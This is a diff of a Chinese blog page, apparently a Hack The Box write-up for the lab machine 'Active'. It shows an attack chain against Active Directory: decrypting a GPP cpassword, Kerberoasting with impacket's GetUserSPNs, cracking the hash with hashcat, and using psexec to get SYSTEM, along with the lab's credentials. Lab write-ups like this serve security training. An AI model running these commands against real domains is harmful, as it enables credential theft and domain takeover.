@@ -50,14 +50,24 @@
 <meta property="og:image" content="https://toxic80l.github.io/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.46.49.png">
 <meta property="og:image" content="https://toxic80l.github.io/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.49.01.png">
 <meta property="article:published_time" content="2022-02-08T01:17:03.000Z">
-<meta property="article:modified_time" content="2022-05-25T10:15:55.800Z">
+<meta property="article:modified_time" content="2022-07-14T08:57:18.654Z">
 <meta property="article:author" content="toxic80L">
-<meta property="article:tag" content="靶机">
-<meta property="article:tag" content="Kerberoasting">
-<meta property="article:tag" content="GPP">
-<meta property="article:tag" content="smb">
-<meta property="article:tag" content="域">
 <meta property="article:tag" content="Windows">
+<meta property="article:tag" content="域">
+<meta property="article:tag" content="Kerberoasting">
+<meta property="article:tag" content="Kerberos">
+<meta property="article:tag" content="GPP">
+<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="nmap">
+<meta property="article:tag" content="enum4linux">
+<meta property="article:tag" content="smbmap">
+<meta property="article:tag" content="smbclient">
+<meta property="article:tag" content="gpp-decrypt">
+<meta property="article:tag" content="GetUserSPNs">
+<meta property="article:tag" content="impacket">
+<meta property="article:tag" content="hashcat">
+<meta property="article:tag" content="psexec">
+<meta property="article:tag" content="哈希破解">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://toxic80l.github.io/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8A%E5%8D%8810.46.32.png">
   
@@ -93,7 +103,7 @@
 
 <div class="widgets">
 
-<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7%E5%85%B1%E4%BA%AB"><span class="toc-text">smb登陆用户共享</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-system"><span class="toc-text">0x02 上线[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E8%8E%B7%E5%8F%96"><span class="toc-text">哈希获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E8%A7%A3%E5%AF%86"><span class="toc-text">哈希解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E4%B8%8A%E7%BA%BF"><span class="toc-text">管理员上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-text">0x03 总结</span></a></li></ol></div></div></div>
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E7%99%BB%E9%99%86"><span class="toc-text">smb登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-system"><span class="toc-text">0x02 上线[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E8%8E%B7%E5%8F%96"><span class="toc-text">哈希获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3"><span class="toc-text">哈希破解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E4%B8%8A%E7%BA%BF"><span class="toc-text">管理员上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-text">0x03 总结</span></a></li></ol></div></div></div>
 
 
 </div>
@@ -134,14 +144,15 @@
 <p>经过一番搜索后在<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>目录下发现文件<code>Groups.xml</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</span><br><span class="line">ls</span><br><span class="line">get Groups.xml</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%882.35.54.png" alt="截屏2021-10-22 下午2.35.54"></p>
-<p>将其下载至本地后发现其中包含域名、用户名、cpassword密码等。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%882.38.33.png" alt="截屏2021-10-22 下午2.38.33"></p>
-<h3 id="smb登陆用户共享"><a href="#smb登陆用户共享" class="headerlink" title="smb登陆用户共享"></a>smb登陆用户共享</h3><blockquote>
+<p>将其下载至本地，查看文件发现其中包含域名、用户名、密码等</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%882.38.33.png" alt="截屏2021-10-22 下午2.38.33"></p>
+<h3 id="smb登陆"><a href="#smb登陆" class="headerlink" title="smb登陆"></a>smb登陆</h3><blockquote>
 <p>在Windows系统中每当创建组策略首选项（GPP）时，都会在 SYSVOL 中创建一个包含该配置数据的xml文件，其中包括与GPP相关联的任何密码，为了安全起见 Microsoft AES 将密码存储为cpassword，但之后微软在 MSDN 上发布了密钥。与此同时微软在2014年发布了一个补丁，阻止管理员将密码输入GPP，但是该补丁对已经存在的可破解密码无任何作用，我们仍能发现之前保存的密码。</p>
 </blockquote>
 <p>由于密钥已知，使用 gpp-decrypt 可成功将 cpassword 解密为<code>GPPstillStandingStrong2k18</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%882.46.24.png" alt="截屏2021-10-22 下午2.46.24"></p>
-<p>使用新获取的账号密码我们可以访问其他三个目录，分别为<code>Users</code>、<code>NETLOGIN</code>、<code>SYSVOL</code> </p>
+<p>新获取到的账号密码可以访问其他三个目录，分别为<code>Users</code>、<code>NETLOGIN</code>、<code>SYSVOL</code> </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%882.52.43.png" alt="截屏2021-10-22 下午2.52.43"></p>
 <p>使用 smbclient 访问目录<code>Users</code></p>
@@ -155,22 +166,22 @@
 </blockquote>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Kerberoasting</span> <span class="string">是一种后利用攻击，它从</span> <span class="string">Active</span> <span class="string">Directory</span> <span class="string">中提取服务帐户凭据哈希以进行离线破解。</span></span><br><span class="line"><span class="string">Kerberoasting</span> <span class="string">是一种常见的、普遍的攻击，它利用弱加密和服务帐户密码的组合。</span></span><br><span class="line"><span class="string">Kerberoasting</span> <span class="string">是有效的，因为攻击者不需要域管理员凭据即可发起此攻击，并且无需向目标发送数据包即可提取服务帐户凭据哈希。</span></span><br></pre></td></tr></table></figure>
 <p><strong>参考文章：<a target="_blank" rel="noopener" href="https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/">https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/</a></strong></p>
-<h4 id="哈希获取"><a href="#哈希获取" class="headerlink" title="哈希获取"></a>哈希获取</h4><p>使用 impacket 中的 GetUserSPNs.py 来获取与服务相关联的用户名列表，在其中发现域管理员账户</p>
+<h4 id="哈希获取"><a href="#哈希获取" class="headerlink" title="哈希获取"></a>哈希获取</h4><p>使用 impacket 中的 GetUserSPNs.py 尝试获取与服务相关联的用户名列表，在其中成功发现域管理员账户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/impacket/examples/GetUserSPNs.py .</span><br><span class="line">python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out</span><br><span class="line"><span class="comment">## 输入密码GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.37.48.png" alt="截屏2021-10-22 下午3.37.48"></p>
-<p>查看输出文件为哈希值<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.38.08.png" alt="截屏2021-10-22 下午3.38.08"></p>
-<h4 id="哈希解密"><a href="#哈希解密" class="headerlink" title="哈希解密"></a>哈希解密</h4><p>使用 hashcat 对获取到的哈希值进行破解，成功破解密码<code>Ticketmaster1968</code></p>
+<p>查看输出文件，为管理员用户凭据的哈希值<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.38.08.png" alt="截屏2021-10-22 下午3.38.08"></p>
+<h4 id="哈希破解"><a href="#哈希破解" class="headerlink" title="哈希破解"></a>哈希破解</h4><p>使用 hashcat 对获取到的哈希值进行破解，成功破解密码<code>Ticketmaster1968</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.41.34.png" alt="截屏2021-10-22 下午3.41.34"></p>
 <h3 id="管理员上线"><a href="#管理员上线" class="headerlink" title="管理员上线"></a>管理员上线</h3><p>使用 impacket 中的 psexec.py 登录账户，成功获得system权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/impacket/examples/psexec.py .</span><br><span class="line">python3 psexec.py active.htb/administrator@10.10.10.100</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.46.49.png" alt="截屏2021-10-22 下午3.46.49"></p>
-<p>在管理员桌面上寻找第二个flag</p>
+<p>在管理员桌面上寻找第二个flag，成功获取到第二个flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
 
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.49.01.png" alt="截屏2021-10-22 下午3.49.01"><br>成功获取到第二个flag</p>
-<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>通过smb匿名登陆后发现组凭证xml文件，在其中发现包含GPP加密后的密文，由于微软已将AES加密的密钥公布，因此我们可以使用gpp-decrypt来破解密文，成功拿到用户SVC_TGS的密码并登陆目标smb服务。</p>
-<p>由于Kerberos协议认证的缺陷，我们可获取到与普通用户相关联的服务用户名列表并拿到对应票据，发现域管理员也在其中，破解其中的哈希值可拿到管理员密码，最终使用psexec成功拿到系统权限。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/61576a4b/%E6%88%AA%E5%B1%8F2021-10-22%20%E4%B8%8B%E5%8D%883.49.01.png" alt="截屏2021-10-22 下午3.49.01"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>Active 根据名称可以判断是一台关于域服务的靶机，使用 eunm4linux 扫描 smb 服务确认为域控主机，通过 smb 匿名登录可访问主机的<code> Replication</code>目录，在其中搜索后发现文件<code>Groups.xml</code>，该文件中包含 GPP 加密后的密文、域名以及用户名。由于微软已经将 AES 加密的密钥公布，因此我们可以使用 gpp-decrypt 来破解密文，成功拿到对应用户的明文密码，使用新拿到的账号密码可登录 smb 服务。</p>
+<p>由于 Kerberos 协议认证的缺陷，我们可以通过 Kerberoasting 的手法来获取到相关联的管理员票据，利用 hashcat 可对获取到的哈希值进行离线破解。而破解后的密码为管理员的密码，使用 psexec 配合管理员密码可直接获取靶机的系统权限。</p>
 
 
 <div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
